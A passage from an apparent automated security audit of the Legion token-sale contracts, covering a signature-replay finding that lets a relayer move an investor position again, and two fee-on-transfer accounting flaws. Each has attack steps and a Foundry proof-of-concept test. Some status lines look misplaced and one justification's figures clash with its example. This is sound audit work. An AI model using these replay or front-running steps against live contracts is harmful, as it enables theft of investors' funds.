    function positionCapital(uint256 id) external view returns (uint256) { return positions[id].investedCapital; }
}

contract PositionReplayPoC is Test {
    function test_ReplayedTransferBurnsDifferentPositionAndDeletesOriginalPositionData() external {
        uint256 signerPk = 0xA11CE;
        address signer = vm.addr(signerPk);
        address relayer = address(0xBEEF);
        address alice = address(0xA1);
        address bob = address(0xB0B);

        ReplayHarness h = new ReplayHarness(signer);
        uint256 p1 = h.mintPosition(alice, 100 ether);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, h.transferHash(alice, bob, p1, relayer));
        bytes memory sig = abi.encodePacked(r, s, v);

        vm.prank(relayer);
        h.transferInvestorPositionWithAuthorization(alice, bob, p1, sig);
        assertEq(h.investorPositionIds(bob), p1);
        assertEq(h.ownerOf(p1), bob);

        uint256 p2 = h.mintPosition(alice, 200 ether);
        assertEq(h.investorPositionIds(alice), p2);

        vm.prank(relayer);
        h.transferInvestorPositionWithAuthorization(alice, bob, p1, sig);

        assertEq(h.investorPositionIds(alice), 0);
        assertFalse(h.exists(p2));
        assertEq(h.positionCapital(p2), 200 ether);
        assertEq(h.investorPositionIds(bob), p1);
        assertEq(h.positionCapital(p1), 0);
    }
}

## Suggested Mitigation
Make transfer authorizations single-use and bounded. Add a nonce or per-signature consumed mapping for transfer signatures, include a deadline and current ownership epoch in the signed payload, and mark the signature used before executing the transfer. In every `_burnOrTransferInvestorPosition` merge path, require `s_investorPositionIds[_from] == _positionId` and `ownerOf(_positionId) == _from`, then burn exactly `_positionId` rather than whatever token is currently mapped to `_from`.
```

### C-10 / `dcLDkpfg2UzZJBkdHIGE1`
- Finding title: Replayable position transfer authorizations can re-steal returned investor positions
- Report lines: 1278-1412
```md
## [C-10]. Replayable position transfer authorizations can re-steal returned investor positions

## id: dcLDkpfg2UzZJBkdHIGE1

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
SignatureReplay

## Location
LegionPositionManager._verifyTransferSignature

## Finding Status: Valid
### Finding Status Justification: The replay condition is present in the supplied code. `_verifyTransferSignature` accepts the same Legion-signed tuple repeatedly because it has no nonce, deadline, or used-digest tracking. `transferInvestorPositionWithAuthorization` does not mark the transfer signature consumed. If Alice's P1 is transferred to Bob with a valid signature, then later transferred back to Alice through another valid authorization, the original Alice-to-Bob signature remains valid for the same `msg.sender`. On replay, `_verifyCanTransferInvestorPosition(P1)` can still pass while the sale is not canceled, refund period is over, sale results are not yet published, and the position has claimed excess but is not settled/refunded. If Bob has no current position, `_burnOrTransferInvestorPosition` takes the transfer branch and `_transferInvestorPosition(Alice,Bob,P1)` succeeds because Alice again owns P1. This moves both the ERC5192 token and `s_investorPositionIds` mapping back to Bob, giving Bob control over later allocation/claim/vesting flows attached to the position. Existing domain separation to contract, chain, and executor does not mitigate same-context replay. The issue is in scoped contracts and is not an intentional documented behavior. It does not depend on privileged-key compromise, governance misconfiguration, future code, user error, or non-standard ERC20 behavior. Impact is High because the economic position can be stolen; likelihood is Occasional because exploitation requires a previously valid transfer authorization and a realistic but specific return-transfer sequence before final settlement.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Transfer authorizations are verified only by recovering the Legion signer from the tuple (_from, _to, _positionId, msg.sender, address(this), block.chainid). The digest has no nonce, deadline, or consumed flag, and the concrete transferInvestorPositionWithAuthorization implementations do not mark transfer signatures as used. Vulnerable snippet: bytes32 _data = keccak256(abi.encodePacked(_from, _to, _positionId, msg.sender, address(this), block.chainid)).toEthSignedMessageHash(); if (_data.recover(_signature) != _signer) revert Errors.LegionSale__InvalidSignature(_signature);. As a result, if a position is transferred back to its previous owner before sale results are published, the old authorization remains valid and can be replayed by the originally authorized msg.sender to move the same position away again. The replay transfers the ERC5192 position NFT and the mapped investorPosition rights, so the old recipient/relayer can regain control of refund, claim, excess-withdrawal, and vesting-release rights represented by the position.

## Impact
Direct theft of an investor position NFT and the economic rights attached to it whenever a previously authorized transfer is replayed after the position cycles back to the original owner.

## Proof of Concept
1. Alice owns position #1 after claiming excess, so it is transferable. 2. Legion signs an authorization for relayer R to transfer position #1 from Alice to Bob. R submits it and Bob receives the position. 3. Before sale results are published, Legion signs a separate authorization returning position #1 from Bob to Alice. R submits it and Alice owns the position again. 4. Because the first authorization was never consumed and contains no nonce or deadline, R replays the old Alice-to-Bob signature. 5. The contract accepts the replay and transfers position #1 back to Bob, giving Bob control of Alice's position rights again.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {LegionPositionManager} from "src/position/LegionPositionManager.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract PositionManagerHarness is LegionPositionManager {
    struct InvestorPosition { uint256 investedCapital; bool hasRefunded; bool hasSettled; bool hasClaimedExcess; }
    mapping(uint256 => InvestorPosition) internal positions;
    address internal signer;

    constructor(address signer_) {
        signer = signer_;
        s_positionManagerConfig.name = "Legion Position";
        s_positionManagerConfig.symbol = "LPOS";
        s_positionManagerConfig.baseURI = "ipfs://base/";
    }

    function mintPosition(address investor, uint256 capital) external returns (uint256 id) {
        id = _createInvestorPosition(investor);
        positions[id] = InvestorPosition(capital, false, false, true);
    }

    function positionOf(address investor) external view returns (uint256) {
        return s_investorPositionIds[investor];
    }

    function transferInvestorPosition(address from, address to, uint256 positionId) external override {
        _verifyCanTransferInvestorPosition(positionId);
        _burnOrTransferInvestorPosition(from, to, positionId);
    }

    function transferInvestorPositionWithAuthorization(address from, address to, uint256 positionId, bytes calldata signature) external override {
        _verifyTransferSignature(from, to, positionId, signer, signature);
        _verifyCanTransferInvestorPosition(positionId);
        _burnOrTransferInvestorPosition(from, to, positionId);
    }

    function _verifyCanTransferInvestorPosition(uint256 positionId) private view {
        InvestorPosition memory position = positions[positionId];
        require(!position.hasRefunded && !position.hasSettled && position.hasClaimedExcess, "not transferable");
    }

    function _burnOrTransferInvestorPosition(address from, address to, uint256 positionId) private {
        uint256 positionIdTo = s_investorPositionIds[to];
        if (positionIdTo != 0) {
            InvestorPosition memory positionToBurn = positions[positionId];
            InvestorPosition storage positionToUpdate = positions[positionIdTo];
            require(!positionToUpdate.hasRefunded && !positionToUpdate.hasSettled && positionToUpdate.hasClaimedExcess, "cannot merge");
            positionToUpdate.investedCapital += positionToBurn.investedCapital;
            delete positions[positionId];
            _burnInvestorPosition(from);
        } else {
            _transferInvestorPosition(from, to, positionId);
        }
    }
}

contract PositionTransferReplayTest is Test {
    using MessageHashUtils for bytes32;

    uint256 internal constant SIGNER_PK = 0xA11CE;

    function _signTransfer(address sale, address from, address to, uint256 positionId, address caller) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked(from, to, positionId, caller, sale, block.chainid)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_PK, digest);
        return abi.encodePacked(r, s, v);
    }

    function test_ReplaysOldTransferAuthorizationAfterPositionReturns() external {
        address legionSigner = vm.addr(SIGNER_PK);
        PositionManagerHarness sale = new PositionManagerHarness(legionSigner);
        address alice = address(0xA11);
        address bob = address(0xB0B);
        address relayer = address(0xCA11);

        uint256 positionId = sale.mintPosition(alice, 100 ether);
        bytes memory aliceToBob = _signTransfer(address(sale), alice, bob, positionId, relayer);

        vm.prank(relayer);
        sale.transferInvestorPositionWithAuthorization(alice, bob, positionId, aliceToBob);
        assertEq(sale.ownerOf(positionId), bob);

        bytes memory bobToAlice = _signTransfer(address(sale), bob, alice, positionId, relayer);
        vm.prank(relayer);
        sale.transferInvestorPositionWithAuthorization(bob, alice, positionId, bobToAlice);
        assertEq(sale.ownerOf(positionId), alice);

        vm.prank(relayer);
        sale.transferInvestorPositionWithAuthorization(alice, bob, positionId, aliceToBob);

        assertEq(sale.ownerOf(positionId), bob);
        assertEq(sale.positionOf(alice), 0);
        assertEq(sale.positionOf(bob), positionId);
    }
}

## Suggested Mitigation
Consume transfer authorizations by storing used digests or per-position nonces before executing the transfer, include a deadline in the signed payload, and require ownerOf(positionId) == from plus s_investorPositionIds[from] == positionId before both transfer and merge branches.





Finding Status: InvalidERC20EdgeCase
```

### H-11 / `zjjz-K9B_RVshExZkHdoH`
- Finding title: Fee-on-transfer bid tokens over-credit deposits and can leave later investor refunds insolvent
- Report lines: 1413-1570
```md
## [H-11]. Fee-on-transfer bid tokens over-credit deposits and can leave later investor refunds insolvent

## id: zjjz-K9B_RVshExZkHdoH

## Derived From Pattern/Invariant
FeeOnTransferAssumption

## Exploit Type
FeeOnTransferAssumption

## Location
LegionPreLiquidOpenApplicationSale.invest

## Finding Status: InvalidERC20EdgeCase
### Finding Status Justification: The described code path exists in LegionPreLiquidOpenApplicationSale.invest: after eligibility, minimum amount, refund, and excess-claim checks, the contract increments s_saleStatus.totalCapitalInvested and s_investorPositions[positionId].investedCapital by the user-supplied amount, then calls SafeTransferLib.safeTransferFrom for that same amount. No balance-before/balance-after check verifies actual received bidToken amount. The refund() and withdrawInvestedCapitalIfCanceled() paths later pay the recorded investedCapital using SafeTransferLib.safeTransfer, so if the bid token takes a transfer fee or otherwise delivers less than the nominal amount, recorded liabilities can exceed contract balance. A simple trace with a 10% fee-on-transfer bid token creates an immediate deficit: deposits record 1100 while only 990 arrives, and first refunders can consume more than their pro-rata actual balance, causing later refunds to revert for insufficient token balance. Existing guards such as signatures, pause, sale timing, and cancellation checks do not mitigate received-amount mismatch. The issue is not documented as intentional behavior. It is in scoped contracts and ERC20 edge cases are identified as a review area, but it does depend on non-standard fee-on-transfer/deflationary token behavior. It does not require user mistake once such a token is configured, and it is not merely future speculation because bidToken is an initialization parameter today. It is not a pure governance-risk-only issue because the code does not enforce a standard-token invariant or reject fee-on-transfer assets; however likelihood is Occasional rather than Common because exploitation requires a fee-on-transfer or similar bid token to be used.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`invest()` credits the caller and `totalCapitalInvested` with the requested `amount` before checking how many bid tokens the sale actually received:

```
s_saleStatus.totalCapitalInvested += amount;
s_investorPositions[positionId].investedCapital += amount;
SafeTransferLib.safeTransferFrom(s_addressConfig.bidToken, msg.sender, address(this), amount);
```

For fee-on-transfer, deflationary, or other non-1:1 bid tokens, the sale balance increases by less than `amount` while refunds and canceled withdrawals later pay the full recorded `investedCapital`. A valid investor can create an accounting deficit and race to refund/withdraw first, leaving later investors unable to recover their recorded deposits because the contract no longer holds enough bid tokens.

## Impact
Eligible investors who refund or withdraw first receive nominal recorded amounts, while later investors' refunds or canceled-sale withdrawals revert from insufficient bidToken balance. This causes temporary or permanent freezing of investor funds unless someone recapitalizes the sale.

## Proof of Concept
1. A sale is deployed with a bidToken that burns or diverts 10% on transfers into the sale.
2. Honest investor deposits 1000 bidToken; the sale records 1000 but receives only 900.
3. Attacker deposits 100 bidToken; the sale records 100 but receives only 90.
4. Attacker refunds first and receives the full recorded 100, reducing the sale balance to 890.
5. Honest investor's refund for 1000 reverts because the sale only holds 890 bidToken.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {LegionPreLiquidOpenApplicationSaleFactory} from "../src/factories/LegionPreLiquidOpenApplicationSaleFactory.sol";
import {LegionPreLiquidOpenApplicationSale} from "../src/sales/LegionPreLiquidOpenApplicationSale.sol";
import {ILegionAbstractSale} from "../src/interfaces/sales/ILegionAbstractSale.sol";

contract FeeOnTransferBidTokenPoC is Test {
    uint256 signerPk = 0xA11CE;
    address legionSigner = vm.addr(signerPk);
    address legionBouncer = address(0xB0);
    address project = address(0xCAFE);
    address honest = address(0x1111);
    address attacker = address(0x2222);

    function testFeeOnTransferBidTokenFreezesLaterRefunds() external {
        TaxedToken bid = new TaxedToken();
        MockRegistry registry = new MockRegistry(legionBouncer, legionSigner);
        LegionPreLiquidOpenApplicationSaleFactory factory = new LegionPreLiquidOpenApplicationSaleFactory(address(this));

        ILegionAbstractSale.LegionSaleInitializationParams memory p = ILegionAbstractSale.LegionSaleInitializationParams({
            salePeriodSeconds: 1 hours,
            refundPeriodSeconds: 1 hours,
            legionFeeOnCapitalRaisedBps: 0,
            legionFeeOnTokensSoldBps: 0,
            referrerFeeOnCapitalRaisedBps: 0,
            referrerFeeOnTokensSoldBps: 0,
            minimumInvestAmount: 1,
            bidToken: address(bid),
            askToken: address(0xA5C),
            projectAdmin: project,
            addressRegistry: address(registry),
            referrerFeeReceiver: address(0xFEE),
            saleName: "SALE",
            saleSymbol: "SALE",
            saleBaseURI: "ipfs://sale/"
        });

        address payable saleAddr = factory.createPreLiquidOpenApplicationSale(p);
        LegionPreLiquidOpenApplicationSale sale = LegionPreLiquidOpenApplicationSale(saleAddr);
        bid.setTaxedReceiver(saleAddr);

        bid.mint(honest, 1000 ether);
        bid.mint(attacker, 100 ether);

        vm.startPrank(honest);
        bid.approve(saleAddr, type(uint256).max);
        sale.invest(1000 ether, _sig(honest, saleAddr));
        vm.stopPrank();

        vm.startPrank(attacker);
        bid.approve(saleAddr, type(uint256).max);
        sale.invest(100 ether, _sig(attacker, saleAddr));
        sale.refund();
        vm.stopPrank();

        assertEq(bid.balanceOf(saleAddr), 890 ether);

        vm.prank(honest);
        vm.expectRevert();
        sale.refund();
    }

    function _sig(address investor, address saleAddr) internal view returns (bytes memory) {
        bytes32 h = keccak256(abi.encodePacked(investor, saleAddr, block.chainid));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }
}

contract MockRegistry {
    mapping(bytes32 => address) internal addrs;
    constructor(address bouncer, address signer) {
        addrs[bytes32("LEGION_BOUNCER")] = bouncer;
        addrs[bytes32("LEGION_SIGNER")] = signer;
        addrs[bytes32("LEGION_FEE_RECEIVER")] = address(0xFEE1);
        addrs[bytes32("LEGION_VESTING_FACTORY")] = address(0xFEE2);
        addrs[bytes32("LEGION_VESTING_CONTROLLER")] = address(0xFEE3);
    }
    function getLegionAddress(bytes32 id) external view returns (address) {
        return addrs[id];
    }
}

contract TaxedToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public taxedReceiver;
    function setTaxedReceiver(address r) external { taxedReceiver = r; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOW");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "BAL");
        balanceOf[from] -= amount;
        uint256 received = to == taxedReceiver ? amount - amount / 10 : amount;
        balanceOf[to] += received;
    }
}

## Suggested Mitigation
Credit deposits from the actual balance delta, not the user-supplied amount. In `invest()`, cache `balanceBefore`, perform `safeTransferFrom`, compute `received = balanceAfter - balanceBefore`, and either require `received == amount` to reject fee-on-transfer tokens or use `received` for `totalCapitalInvested` and `investedCapital`. Apply the same balance-delta validation to token supply paths as well.





Finding Status: LowSeverityDueToRareLikelihood + InvalidERC20EdgeCase
```

### H-12 / `N3pyy1ob4Oimqad_K-3yo`
- Finding title: Fee-on-transfer askToken makes distributor insolvent and freezes later valid token claims
- Report lines: 1571-1714
```md
## [H-12]. Fee-on-transfer askToken makes distributor insolvent and freezes later valid token claims

## id: N3pyy1ob4Oimqad_K-3yo

## Derived From Pattern/Invariant
FeeOnTransferAssumption

## Exploit Type
FeeOnTransferAssumption

## Location
LegionTokenDistributor.supplyTokens

## Finding Status: LowSeverityDueToRareLikelihood + InvalidERC20EdgeCase
### Finding Status Justification: The cited code path exists. supplyTokens requires amount == totalAmountToDistribute, sets tokensSupplied = true, then uses SafeTransferLib.safeTransferFrom without checking the distributor balance delta. claimTokenAllocation later marks the caller settled, increments totalAmountClaimed by the nominal claimAmount, and transfers nominal immediate/vesting amounts. If askToken takes a transfer fee on supply, the distributor can hold less than totalAmountToDistribute while claims are enabled, so earlier valid claims can consume the reduced balance and later valid claims revert. There is no balance-before/after safeguard, no token allowlist shown, and no solvency check before claims. This is not documented as intentional. It is in the listed distributor scope and external-token behavior is a stated review area, but the finding depends entirely on fee-on-transfer token behavior, so non_standard_token is true. The impact is a temporary freeze/failed claims for later users rather than direct theft from the contract by an arbitrary attacker; the triggering token behavior is specific and not standard ERC20, making likelihood rare.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
supplyTokens assumes the distributor receives exactly amount askToken and sets tokensSupplied = true without checking the post-transfer balance delta. claimTokenAllocation also accounts and settles using nominal claimAmount rather than actual delivered amounts. With a fee-on-transfer askToken, the distributor can receive less than totalAmountToDistribute while still enabling claims, so early claimants can consume the reduced balance and later valid claims revert.

Vulnerable snippets:
s_tokenDistributorConfig.tokensSupplied = true;
...
SafeTransferLib.safeTransferFrom(tokenDistributorConfig.askToken, msg.sender, address(this), amount);

s_tokenDistributorConfig.totalAmountClaimed += claimAmount;
...
SafeTransferLib.safeTransfer(tokenDistributorConfig.askToken, msg.sender, amountToDistributeOnClaim);

## Impact
Valid later investors are temporarily frozen out of their token allocations because the contract marks the distribution as fully supplied while its actual token balance is short. Early claimants can race to consume the reduced balance, leaving remaining claimants unable to settle.

## Proof of Concept
1. Distributor is initialized with a fee-on-transfer askToken and totalAmountToDistribute = 1,000 tokens.
2. Project calls supplyTokens(1,000, 0, 0). The token burns or taxes 10%, so the distributor receives only 900 tokens, but tokensSupplied is set to true.
3. A large valid claimant front-runs and claims 900 tokens with 100% TGE vesting.
4. The distributor balance becomes zero.
5. A second investor with a valid 100-token claim now reverts from insufficient balance even though the distributor reports tokensSupplied and their signature is valid.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {LibClone} from "@solady/src/utils/LibClone.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {LegionTokenDistributor} from "src/distribution/LegionTokenDistributor.sol";
import {ILegionTokenDistributor} from "src/interfaces/distribution/ILegionTokenDistributor.sol";
import {ILegionAddressRegistry} from "src/interfaces/registries/ILegionAddressRegistry.sol";
import {ILegionVestingManager} from "src/interfaces/vesting/ILegionVestingManager.sol";
import {Constants} from "src/utils/Constants.sol";

contract RegistryMock is ILegionAddressRegistry {
    mapping(bytes32 => address) public addrs;
    function setLegionAddress(bytes32 id, address updatedAddress) external { addrs[id] = updatedAddress; }
    function getLegionAddress(bytes32 id) external view returns (address) { return addrs[id]; }
}

contract FeeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { _move(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(allowance[from][msg.sender] >= amount, "ALLOW"); allowance[from][msg.sender] -= amount; _move(from, to, amount); return true; }
    function _move(address from, address to, uint256 amount) internal { require(balanceOf[from] >= amount, "BAL"); balanceOf[from] -= amount; uint256 received = amount * 90 / 100; balanceOf[to] += received; }
}

contract DistributorFeeOnTransferPoC is Test {
    using MessageHashUtils for bytes32;

    uint256 signerPk = 0xB0B;
    address signer = vm.addr(signerPk);
    address project = address(0x100);
    address large = address(0x200);
    address small = address(0x300);
    FeeToken token;
    LegionTokenDistributor distributor;

    function setUp() public {
        token = new FeeToken();
        RegistryMock registry = new RegistryMock();
        registry.setLegionAddress(Constants.LEGION_BOUNCER_ID, address(0xB0));
        registry.setLegionAddress(Constants.LEGION_SIGNER_ID, signer);
        registry.setLegionAddress(Constants.LEGION_FEE_RECEIVER_ID, address(0xF0));
        registry.setLegionAddress(Constants.LEGION_VESTING_FACTORY_ID, address(0xF1));
        registry.setLegionAddress(Constants.LEGION_VESTING_CONTROLLER_ID, address(0xF2));

        address impl = address(new LegionTokenDistributor());
        distributor = LegionTokenDistributor(payable(impl.clone()));
        distributor.initialize(ILegionTokenDistributor.TokenDistributorInitializationParams({
            legionFeeOnTokensSoldBps: 0,
            referrerFeeOnTokensSoldBps: 0,
            referrerFeeReceiver: address(0xF3),
            askToken: address(token),
            addressRegistry: address(registry),
            projectAdmin: project,
            totalAmountToDistribute: 1000 ether
        }));

        token.mint(project, 1000 ether);
        vm.prank(project);
        token.approve(address(distributor), type(uint256).max);
        vm.prank(project);
        distributor.supplyTokens(1000 ether, 0, 0);
        assertEq(token.balanceOf(address(distributor)), 900 ether);
    }

    function signClaim(address investor, uint256 amount) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked(investor, address(distributor), block.chainid, amount)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function signVesting(address investor, ILegionVestingManager.LegionInvestorVestingConfig memory cfg) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encode(investor, address(distributor), block.chainid, cfg)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function fullTge() internal pure returns (ILegionVestingManager.LegionInvestorVestingConfig memory cfg) {
        cfg.vestingType = ILegionVestingManager.VestingType.LEGION_LINEAR;
        cfg.tokenAllocationOnTGERate = uint64(Constants.TOKEN_ALLOCATION_RATE_DENOMINATOR);
    }

    function testFeeOnTransferSupplyFreezesLaterClaim() external {
        ILegionVestingManager.LegionInvestorVestingConfig memory cfg = fullTge();
        vm.prank(large);
        distributor.claimTokenAllocation(900 ether, cfg, signClaim(large, 900 ether), signVesting(large, cfg));
        assertEq(token.balanceOf(address(distributor)), 0);

        vm.prank(small);
        vm.expectRevert();
        distributor.claimTokenAllocation(100 ether, cfg, signClaim(small, 100 ether), signVesting(small, cfg));
    }
}

## Suggested Mitigation
Either reject fee-on-transfer/rebasing askTokens explicitly or use balance-before/balance-after accounting in supplyTokens and claims. supplyTokens should require actualReceived == amount before setting tokensSupplied, and claim accounting should be based on actual token movements or enforce a strict allowlist of standard ERC20 tokens.
```
